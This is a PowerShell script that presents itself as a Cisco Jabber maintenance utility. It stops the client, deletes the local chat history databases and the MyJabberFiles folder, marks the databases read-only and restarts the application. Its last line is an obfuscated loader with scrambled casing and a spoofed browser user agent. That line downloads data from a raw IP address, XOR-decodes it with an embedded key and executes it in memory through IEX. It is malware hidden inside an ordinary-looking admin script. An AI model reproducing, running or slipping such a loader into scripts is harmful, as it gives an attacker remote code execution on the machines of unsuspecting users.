[CmdletBinding()]param ()function Close-Process {[CmdletBinding()][OutputType([boolean])]param([ValidateNotNullOrEmpty()][string]$ProcessName)$Process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinueIf ($Process -ne $null) {$Output = "Stopping " + $Process.Name + " process....."Stop-Process -Name $Process.Name -Force -ErrorAction SilentlyContinueStart-Sleep -Seconds 1$TestProcess = Get-Process $ProcessName -ErrorAction SilentlyContinueIf ($TestProcess -eq $null) {$Output += "Success"Write-Host $OutputReturn $true} else {$Output += "Failed"Write-Host $OutputReturn $false}} else {Return $true}}function Get-RelativePath {[CmdletBinding()][OutputType([string])]param ()$Path = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + "\"Return $Path}function Open-Application {[CmdletBinding()]param([string]$Executable,[ValidateNotNullOrEmpty()][string]$ApplicationName)$Architecture = Get-Architecture$Uninstall = Get-ChildItem -Path REGISTRY::"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"If ($Architecture -eq "64-bit") {$Uninstall += Get-ChildItem -Path REGISTRY::"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"}$InstallLocation = ($Uninstall | ForEach-Object { Get-ItemProperty $_.PsPath } | Where-Object { $_.DisplayName -eq $ApplicationName }).InstallLocationIf ($InstallLocation[$InstallLocation.Length - 1] -ne "\") {$InstallLocation += "\"}$Process = ($Executable.Split("."))[0]$Output = "Opening $ApplicationName....."Start-Process -FilePath $InstallLocation$Executable -ErrorAction SilentlyContinueStart-Sleep -Seconds 5$NewProcess = Get-Process $Process -ErrorAction SilentlyContinueIf ($NewProcess -ne $null) {$Output += "Success"} else {$Output += "Failed"}Write-Output $Output}function Remove-ChatFiles {[CmdletBinding()]param ()$ChatHistoryFiles = Get-ChildItem -Path $env:USERPROFILE'\AppData\Local\Cisco\Unified Communications\Jabber\CSF\History' -Filter *.dbIf ($ChatHistoryFiles -ne $null) {foreach ($File in $ChatHistoryFiles) {$Output = "Deleting " + $File.Name + "....."Remove-Item -Path $File.FullName -Force | Out-NullIf ((Test-Path $File.FullName) -eq $false) {$Output += "Success"} else {$Output += "Failed"}}Write-Output $Output} else {$Output = "No Chat History Present"Write-Output $Output}}function Remove-MyJabberFilesFolder {[CmdletBinding()]param ()$MyJabberFilesFolder = Get-Item $env:USERPROFILE'\Documents\MyJabberFiles' -ErrorAction SilentlyContinueIf ($MyJabberFilesFolder -ne $null) {$Output = "Deleting " + $MyJabberFilesFolder.Name + "....."Remove-Item -Path $MyJabberFilesFolder -Recurse -Force | Out-NullIf ((Test-Path $MyJabberFilesFolder.FullName) -eq $false) {$Output += "Success"} else {$Output += "Failed"}Write-Output $Output} else {$Output = "No MyJabberFiles folder present"Write-Output $Output}}function Set-DBFilePermissions {[CmdletBinding()]param ()$ChatHistoryFiles = Get-ChildItem -Path $env:USERPROFILE'\AppData\Local\Cisco\Unified Communications\Jabber\CSF\History' -Filter *.dbforeach ($File in $ChatHistoryFiles) {$Output = "Setting " + $File.Name + " to Read-Only....."$ReadOnly = Get-ItemPropertyValue -Path $File.FullName -Name IsReadOnlyIf (($ReadOnly) -eq $false) {Set-ItemProperty -Path $File.FullName -Name IsReadOnly -Value $true$ReadOnly = Get-ItemPropertyValue -Path $File.FullName -Name IsReadOnlyIf (($ReadOnly) -eq $true) {$Output += "Success"} else {$Output += "Failed"}} else {$Output += "Success"}Write-Output $Output}}Clear-Host$JabberClosed = Close-Process -ProcessName CiscoJabberRemove-ChatFilesRemove-MyJabberFilesFolderIf ($JabberClosed -eq $true) {Open-Application -ApplicationName "Cisco Jabber" -Executable CiscoJabber.exe}$JabberClosed = Close-Process -ProcessName CiscoJabberSet-DBFilePermissionsIf ($JabberClosed -eq $true) {Open-Application -ApplicationName "Cisco Jabber" -Executable CiscoJabber.exe}$Wc=NeW-ObjeCt SySTEM.Net.WebCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadeRS.ADd('User-Agent',$u);$wc.PrOxy = [SyStem.NeT.WEbReQUeSt]::DEFauLTWeBProxy;$WC.PRoXY.CrEdENTIaLS = [SYStEM.NeT.CReDEnTiALCaChE]::DEFaulTNeTworKCREdeNtiaLS;$K='0192023a7bbd73250516f069df18b500';$i=0;[CHAr[]]$B=([CHaR[]]($wc.DOwnloaDSTRing("http://23.239.12.15:8080/index.asp")))|%{$_-BXOr$k[$i++%$K.LENgTh]};IEX ($B-jOIn'')